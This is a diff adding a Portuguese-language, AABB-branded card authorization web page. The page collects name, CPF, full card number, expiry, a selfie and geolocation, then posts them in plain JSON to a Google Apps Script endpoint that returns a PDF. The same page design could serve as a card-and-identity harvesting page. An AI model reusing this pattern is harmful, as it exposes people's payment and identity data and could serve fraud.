@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(135deg, #003366, #0055A5);
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  min-height: 100vh;
+  padding: 20px 0;
+}
+
+.container {
+  background: #fff;
+  width: 100%;
+  max-width: 430px;
+  border-radius: 20px;
+  padding: 30px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.25);
+}
+
+h2 {
+  text-align: center;
+  color: #003366;
+  margin-bottom: 25px;
+}
+
+h3 {
+  color: #003366;
+  margin-bottom: 10px;
+}
+
+/* CARTÃO */
+.credit-card-preview {
+  position: relative;
+  background: linear-gradient(135deg, #FFC300, #FFB000);
+  border-radius: 18px;
+  padding: 20px;
+  color: white;
+  margin-bottom: 25px;
+  box-shadow: 0 12px 25px rgba(0,0,0,0.3);
+  overflow: hidden;
+}
+
+.credit-card-preview::after {
+  content: "";
+  position: absolute;
+  top: 0; left: -150%;
+  width: 60%; height: 100%;
+  background: linear-gradient(120deg, transparent, rgba(255,255,255,0.5), transparent);
+  transform: skewX(-20deg);
+  animation: brilho 4s infinite;
+}
+
+@keyframes brilho {
+  0%   { left: -150%; }
+  100% { left: 150%; }
+}
+
+.chip {
+  width: 45px; height: 35px;
+  background: linear-gradient(135deg, #d4af37, #f5e28a);
+  border-radius: 6px;
+  margin-top: 10px;
+  box-shadow: inset 0 0 4px rgba(0,0,0,0.5);
+}
+
+.logo-bandeira { position: absolute; top: 15px; right: 20px; }
+.logo-bandeira img { height: 28px; display: none; }
+
+.card-number {
+  font-size: 20px; letter-spacing: 3px;
+  margin: 20px 0;
+  font-family: 'Courier New', monospace;
+}
+
+.card-name { font-size: 14px; }
+.card-exp  { font-size: 12px; }
+
+/* CAMPOS */
+.field { position: relative; margin-bottom: 22px; }
+
+.field input,
+.field select {
+  width: 100%; padding: 14px 10px;
+  border: none; border-bottom: 2px solid #ccc;
+  outline: none; font-size: 16px; background: transparent;
+}
+
+.field input:focus,
+.field select:focus { border-bottom: 2px solid #0055A5; }
+
+.field label {
+  position: absolute; left: 10px; top: 14px;
+  color: #777; font-size: 14px;
+  transition: 0.3s; pointer-events: none;
+}
+
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label,
+.field select:focus + label,
+.field select.has-value + label {
+  top: -8px; font-size: 12px; color: #0055A5;
+}
+
+/* UPLOAD FOTO */
+.selfie-area { margin-bottom: 20px; }
+#inputSelfie { display: none; }
+
+.upload-label {
+  display: block; width: 100%; padding: 14px;
+  background: #0055A5; color: #fff;
+  border-radius: 14px; font-size: 16px; font-weight: bold;
+  text-align: center; cursor: pointer;
+  margin-bottom: 10px; transition: opacity 0.2s;
+}
+.upload-label:hover { opacity: 0.88; }
+
+#selfiePreview { display: none; }
+
+.selfie-status { font-size: 13px; color: #777; margin-top: 6px; text-align: center; }
+.selfie-status.ok   { color: #28a745; font-weight: bold; }
+.selfie-status.erro { color: #dc3545; }
+
+/* BOTÕES */
+.btn {
+  width: 100%; padding: 14px; border: none;
+  border-radius: 14px; font-size: 16px; font-weight: bold;
+  cursor: pointer; margin-bottom: 10px; transition: opacity 0.2s;
+}
+.btn:disabled { background: #ccc !important; color: #888 !important; cursor: not-allowed; }
+.btn-retake { background: #6c757d; color: #fff; display: none; }
+.btn-gerar  { background: #FFC300; color: #003366; }
+
+/* LOGO */
+.logo-area { text-align: center; margin-bottom: 20px; }
+.logo-area img { max-width: 160px; }
+
+/* LOADING */
+.loading {
+  display: none; text-align: center;
+  padding: 10px; color: #0055A5; font-weight: bold;
+}
+.loading::after {
+  content: ''; display: inline-block;
+  width: 16px; height: 16px;
+  border: 3px solid #0055A5; border-top-color: transparent;
+  border-radius: 50%; animation: spin 0.8s linear infinite;
+  margin-left: 8px; vertical-align: middle;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.footer { text-align: center; font-size: 12px; margin-top: 15px; color: #777; }
+
+.erro-msg {
+  background: #fff3f3; border: 1px solid #f5c6c6;
+  color: #dc3545; border-radius: 8px; padding: 10px;
+  font-size: 13px; margin-bottom: 10px; display: none;
+}
+
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="logo-area">
+    <img id="logo" alt="AABB">
+  </div>
+
+  <h2>Autorização de Cartão</h2>
+
+  <!-- CARTÃO VISUAL -->
+  <div class="credit-card-preview" id="cartaoPreview">
+    <div class="logo-bandeira"><img id="imgBandeira" alt=""></div>
+    <div class="chip"></div>
+    <div class="card-number" id="previewNumero">0000 0000 0000 0000</div>
+    <div class="card-name"   id="previewNome">NOME COMPLETO</div>
+    <div class="card-exp"    id="previewValidade">00/00</div>
+  </div>
+
+  <!-- CAMPOS -->
+  <div class="field">
+    <input type="text" id="nome" placeholder=" " oninput="atualizarPreview()" style="text-transform:uppercase">
+    <label>Nome Completo</label>
+  </div>
+
+  <div class="field">
+    <input type="text" id="cpf" maxlength="14" placeholder=" ">
+    <label>CPF</label>
+  </div>
+
+  <div class="field">
+    <input type="text" id="cartao" maxlength="19" placeholder=" " oninput="atualizarCartao()">
+    <label>Número do Cartão</label>
+  </div>
+
+  <div class="field">
+    <input type="text" id="validade" maxlength="5" placeholder=" ">
+    <label>Validade (MM/AA)</label>
+  </div>
+
+  <div class="field">
+    <input type="number" id="vencimento" min="1" max="31" placeholder=" ">
+    <label>Dia de Vencimento da Fatura</label>
+  </div>
+
+  <div class="field">
+    <input type="text" id="mesInicio" placeholder=" ">
+    <label>Mês de Início</label>
+  </div>
+
+  <!-- FOTO -->
+  <h3>📷 Confirmação por Foto</h3>
+  <p style="font-size:13px;color:#777;margin-bottom:12px;">
+    Tire uma selfie ou escolha uma foto da galeria.
+  </p>
+
+  <div class="selfie-area">
+    <input type="file" id="inputSelfie" accept="image/*" capture="user" onchange="carregarFoto(event)">
+    <label class="upload-label" for="inputSelfie" id="labelUpload">📸 Tirar / Escolher Foto</label>
+    <button class="btn btn-retake" id="btnRetirar" onclick="retirarFoto()">🔄 Trocar Foto</button>
+    <img id="selfiePreview" alt="Foto carregada">
+    <div class="selfie-status" id="selfieStatus">Nenhuma foto selecionada</div>
+  </div>
+
+  <!-- ERRO -->
+  <div class="erro-msg" id="erroMsg"></div>
+
+  <!-- LOADING -->
+  <div class="loading" id="loading">Gerando PDF, aguarde</div>
+
+  <!-- GERAR -->
+  <button class="btn btn-gerar" id="btnGerar" onclick="gerarAutorizacao()">
+    Gerar Autorização
+  </button>
+
+  <div class="footer">Sistema seguro • Conexão criptografada</div>
+
+</div>
+
+<script>
+
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKs0VZlsV4uHBX9WSYNrqP7rJE-1FZePkWnRiGOoDvMOzt74YQqsMgbe0bwB861mYw/exec";
+
+/* ── LOGOS E CORES ── */
+function svgBase64(svg){
+  return "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svg)));
+}
+
+const logosBandeiras = {
+  "VISA":             svgBase64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 26"><text y="22" font-size="26" font-family="Arial,sans-serif" font-weight="900" font-style="italic" fill="white">VISA</text></svg>'),
+  "MASTERCARD":       svgBase64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 38"><circle cx="21" cy="19" r="17" fill="#EB001B"/><circle cx="39" cy="19" r="17" fill="#F79E1B" opacity="0.85"/></svg>'),
+  "AMERICAN EXPRESS": svgBase64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 32"><text y="14" font-size="11" font-family="Arial,sans-serif" font-weight="bold" fill="white">AMERICAN</text><text y="28" font-size="11" font-family="Arial,sans-serif" font-weight="bold" fill="white">EXPRESS</text></svg>'),
+  "DINERS":           svgBase64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 90 30"><text y="22" font-size="18" font-family="Arial,sans-serif" font-weight="bold" fill="white">DINERS</text></svg>'),
+  "HIPERCARD":        svgBase64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 30"><text y="22" font-size="18" font-family="Arial,sans-serif" font-weight="bold" fill="white">HIPERCARD</text></svg>'),
+  "ELO":              svgBase64('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 30"><text y="24" font-size="26" font-family="Arial,sans-serif" font-weight="900" fill="white">elo</text></svg>')
+};
+
+const coresCartao = {
+  "VISA":             "linear-gradient(135deg,#1A1F71,#3A47D5)",
+  "MASTERCARD":       "linear-gradient(135deg,#EB001B,#F79E1B)",
+  "AMERICAN EXPRESS": "linear-gradient(135deg,#2E77BC,#1B4F8A)",
+  "DINERS":           "linear-gradient(135deg,#0079BE,#004E7C)",
+  "HIPERCARD":        "linear-gradient(135deg,#B3131B,#E03A3E)",
+  "ELO":              "linear-gradient(135deg,#111,#444)",
+  "PADRAO":           "linear-gradient(135deg,#FFC300,#FFB000)"
+};
+
+/* ── LOGO AABB ── */
+fetch(SCRIPT_URL + "?acao=getLogo")
+  .then(r => r.json())
+  .then(d => { if(d.base64) document.getElementById("logo").src = "data:image/png;base64," + d.base64; })
+  .catch(() => {});
+
+/* ── BANDEIRA ── */
+function identificarBandeira(numero){
+  if(/^(4011|4312|4389|4514|4576|5041|5066|5090|6277|6362|6363)/.test(numero)) return "ELO";
+  if(/^3[47]/.test(numero))              return "AMERICAN EXPRESS";
+  if(/^3(0[0-5]|6)/.test(numero))       return "DINERS";
+  if(/^(6062|3841|60)/.test(numero))    return "HIPERCARD";
+  if(/^5[1-5]/.test(numero) || /^2(2[2-9]|[3-7][0-9])/.test(numero)) return "MASTERCARD";
+  if(/^4/.test(numero))                  return "VISA";
+  return "OUTRO";
+}
+
+/* ── LUHN ── */
+function validarLuhn(numero){
+  let soma = 0, alt = false;
+  for(let i = numero.length - 1; i >= 0; i--){
+    let n = parseInt(numero[i]);
+    if(alt){ n *= 2; if(n > 9) n -= 9; }
+    soma += n; alt = !alt;
+  }
+  return soma % 10 === 0;
+}
+
+/* ── PREVIEW NOME ── */
+function atualizarPreview(){
+  const val = document.getElementById("nome").value.toUpperCase();
+  document.getElementById("nome").value = val;
+  document.getElementById("previewNome").innerText = val || "NOME COMPLETO";
+}
+
+/* ── ATUALIZAR CARTÃO ── */
+function atualizarCartao(){
+  const input = document.getElementById("cartao");
+  let numero = input.value.replace(/\D/g,'');
+  if(numero.length > 16) numero = numero.substring(0,16);
+  input.value = numero.replace(/(\d{4})(?=\d)/g,"$1 ");
+  document.getElementById("previewNumero").innerText = input.value || "0000 0000 0000 0000";
+
+  const bandeira = identificarBandeira(numero);
+  document.getElementById("cartaoPreview").style.background = coresCartao[bandeira] || coresCartao["PADRAO"];
+
+  const imgBandeira = document.getElementById("imgBandeira");
+  if(logosBandeiras[bandeira]){
+    imgBandeira.src = logosBandeiras[bandeira];
+    imgBandeira.style.display = "block";
+  } else {
+    imgBandeira.style.display = "none";
+  }
+
+  const tamanho = {"AMERICAN EXPRESS":15,"DINERS":14}[bandeira] || 16;
+  const btnGerar = document.getElementById("btnGerar");
+  btnGerar.disabled = (numero.length === tamanho && !validarLuhn(numero));
+}
+
+/* ── CPF MÁSCARA ── */
+document.getElementById("cpf").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\D/g,"");
+  if(v.length > 11) v = v.substring(0,11);
+  if(v.length > 9)      v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,"$1.$2.$3-$4");
+  else if(v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d+)/,"$1.$2.$3");
+  else if(v.length > 3) v = v.replace(/(\d{3})(\d+)/,"$1.$2");
+  e.target.value = v;
+});
+
+/* ── VALIDADE MÁSCARA ── */
+document.getElementById("validade").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\D/g,"");
+  if(v.length > 4) v = v.substring(0,4);
+  if(v.length > 2) v = v.replace(/(\d{2})(\d)/,"$1/$2");
+  e.target.value = v;
+  document.getElementById("previewValidade").innerText = v || "00/00";
+});
+
+/* ── VENCIMENTO ── */
+document.getElementById("vencimento").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\D/g,"");
+  if(v.length > 2) v = v.substring(0,2);
+  if(parseInt(v) > 31) v = "31";
+  e.target.value = v;
+});
+
+/* ── FOTO ── */
+let selfieBase64 = "";
+
+function carregarFoto(event){
+  const file = event.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = function(e){
+    selfieBase64 = e.target.result;
+    document.getElementById("labelUpload").style.display = "none";
+    document.getElementById("btnRetirar").style.display  = "block";
+    setStatus("✅ Foto carregada com sucesso!", "ok");
+  };
+  reader.readAsDataURL(file);
+}
+
+function retirarFoto(){
+  selfieBase64 = "";
+  document.getElementById("btnRetirar").style.display  = "none";
+  document.getElementById("labelUpload").style.display = "block";
+  document.getElementById("inputSelfie").value         = "";
+  setStatus("Nenhuma foto selecionada", "");
+}
+
+function setStatus(msg, tipo){
+  const el = document.getElementById("selfieStatus");
+  el.innerText  = msg;
+  el.className  = "selfie-status" + (tipo ? " " + tipo : "");
+}
+
+/* ── LOCALIZAÇÃO ── */
+let latitude = 0, longitude = 0;
+
+function obterLocalizacao(){
+  return new Promise(function(resolve){
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          latitude  = pos.coords.latitude;
+          longitude = pos.coords.longitude;
+          resolve({ lat: latitude, lon: longitude, localizacaoCliente: "" });
+        },
+        function(){
+          fetch("https://freeipapi.com/api/json")
+            .then(r => r.json()).catch(() => ({}))
+            .then(function(d){
+              const loc = d.cityName ? (d.cityName + ", " + (d.regionName||"") + " - " + (d.countryName||"")) : "";
+              resolve({ lat:0, lon:0, localizacaoCliente: loc });
+            });
+        },
+        { timeout: 6000 }
+      );
+    } else {
+      fetch("https://freeipapi.com/api/json")
+        .then(r => r.json()).catch(() => ({}))
+        .then(function(d){
+          const loc = d.cityName ? (d.cityName + ", " + (d.regionName||"") + " - " + (d.countryName||"")) : "";
+          resolve({ lat:0, lon:0, localizacaoCliente: loc });
+        });
+    }
+  });
+}
+
+/* ── VALIDAR ── */
+function validarCampos(){
+  const campos = [
+    { id:"nome",       label:"Nome Completo" },
+    { id:"cpf",        label:"CPF" },
+    { id:"cartao",     label:"Número do Cartão" },
+    { id:"validade",   label:"Validade" },
+    { id:"vencimento", label:"Dia de Vencimento" },
+    { id:"mesInicio",  label:"Mês de Início" },
+  ];
+  for(const c of campos){
+    const el = document.getElementById(c.id);
+    if(!el.value || el.value.trim() === ""){
+      mostrarErro("Por favor, preencha o campo: " + c.label);
+      el.focus();
+      return false;
+    }
+  }
+  if(!selfieBase64){
+    mostrarErro("Por favor, adicione uma foto antes de gerar a autorização.");
+    return false;
+  }
+  return true;
+}
+
+function mostrarErro(msg){
+  const el = document.getElementById("erroMsg");
+  el.innerText = msg;
+  el.style.display = "block";
+  setTimeout(() => el.style.display = "none", 5000);
+}
+
+/* ── GERAR IMAGEM DO CARTÃO ── */
+function gerarImagemCartao(bandeira, numero, nome, validade){
+  const canvas  = document.createElement("canvas");
+  canvas.width  = 480;
+  canvas.height = 280;
+  const ctx = canvas.getContext("2d");
+
+  const cores = {
+    "VISA":             ["#1A1F71","#3A47D5"],
+    "MASTERCARD":       ["#880000","#CC3300"],
+    "AMERICAN EXPRESS": ["#1B4F8A","#2E77BC"],
+    "DINERS":           ["#004E7C","#0079BE"],
+    "HIPERCARD":        ["#B3131B","#E03A3E"],
+    "ELO":              ["#111111","#444444"],
+    "OUTRO":            ["#7a6000","#B8860B"]
+  };
+
+  const [c1, c2] = cores[bandeira] || cores["OUTRO"];
+  const grad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+  grad.addColorStop(0, c1);
+  grad.addColorStop(1, c2);
+  ctx.fillStyle = grad;
+
+  const r = 24;
+  ctx.beginPath();
+  ctx.moveTo(r,0); ctx.lineTo(canvas.width-r,0);
+  ctx.quadraticCurveTo(canvas.width,0,canvas.width,r);
+  ctx.lineTo(canvas.width,canvas.height-r);
+  ctx.quadraticCurveTo(canvas.width,canvas.height,canvas.width-r,canvas.height);
+  ctx.lineTo(r,canvas.height);
+  ctx.quadraticCurveTo(0,canvas.height,0,canvas.height-r);
+  ctx.lineTo(0,r);
+  ctx.quadraticCurveTo(0,0,r,0);
+  ctx.closePath();
+  ctx.fill();
+
+  // Chip dourado
+  ctx.fillStyle = "#d4af37";
+  ctx.beginPath(); ctx.roundRect(30,80,60,44,8); ctx.fill();
+  ctx.strokeStyle = "#f5e28a"; ctx.lineWidth = 1.5; ctx.stroke();
+  ctx.strokeStyle = "#b8960c"; ctx.lineWidth = 1;
+  ctx.beginPath(); ctx.moveTo(30,102); ctx.lineTo(90,102); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(60,80);  ctx.lineTo(60,124); ctx.stroke();
+
+  // Bandeira
+  ctx.fillStyle = "rgba(255,255,255,0.95)";
+  ctx.font = "bold 22px Arial";
+  ctx.textAlign = "right";
+  ctx.fillText(bandeira, canvas.width-28, 44);
+
+  // Número
+  ctx.font = "bold 30px 'Courier New', monospace";
+  ctx.textAlign = "left";
+  ctx.fillStyle = "white";
+  ctx.fillText(numero.replace(/\s/g,"  "), 28, 170);
+
+  // Nome
+  ctx.font = "16px Arial";
+  ctx.fillStyle = "rgba(255,255,255,0.9)";
+  ctx.fillText(nome.substring(0,26).toUpperCase(), 28, 210);
+
+  // Validade
+  ctx.font = "14px Arial";
+  ctx.fillStyle = "rgba(255,255,255,0.7)";
+  ctx.fillText("VÁLIDO: " + validade, 28, 240);
+
+  return canvas.toDataURL("image/png");
+}
+
+/* ── GERAR PDF ── */
+function gerarAutorizacao(){
+  if(!validarCampos()) return;
+
+  const btnGerar = document.getElementById("btnGerar");
+  const loading  = document.getElementById("loading");
+  btnGerar.disabled = true;
+  loading.style.display = "block";
+
+  const numero   = document.getElementById("cartao").value.replace(/\s/g,'');
+  const bandeira = identificarBandeira(numero);
+  const cartaoImagem = gerarImagemCartao(
+    bandeira,
+    document.getElementById("cartao").value,
+    document.getElementById("nome").value,
+    document.getElementById("validade").value
+  );
+
+  obterLocalizacao().then(function(geo){
+    const dados = {
+      acao:               "gerarPDF",
+      nome:               document.getElementById("nome").value,
+      cpf:                document.getElementById("cpf").value,
+      cartao:             numero,
+      validade:           document.getElementById("validade").value,
+      vencimento:         document.getElementById("vencimento").value,
+      mesInicio:          document.getElementById("mesInicio").value,
+      bandeira:           bandeira,
+      selfie:             selfieBase64,
+      cartaoImagem:       cartaoImagem,
+      lat:                geo.lat,
+      lon:                geo.lon,
+      localizacaoCliente: geo.localizacaoCliente
+    };
+
+    fetch(SCRIPT_URL, {
+      method:  "POST",
+      body:    JSON.stringify(dados)
+    })
+    .then(r => r.json())
+    .then(function(res){
+      loading.style.display = "none";
+      btnGerar.disabled = false;
+      if(res.b64){
+        const nomeArq = document.getElementById("nome").value.replace(/\s+/g,"_");
+        const link    = document.createElement("a");
+        link.href     = "data:application/pdf;base64," + res.b64;
+        link.download = "Autorizacao_" + nomeArq + ".pdf";
+        link.target   = "_blank";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      } else {
+        mostrarErro(res.erro || "Erro ao gerar o PDF. Tente novamente.");
+      }
+    })
+    .catch(function(err){
+      loading.style.display = "none";
+      btnGerar.disabled = false;
+      mostrarErro("Erro de conexão. Tente novamente.");
+    });
+  });
+}
+
+</script>
+</body>
+</html>
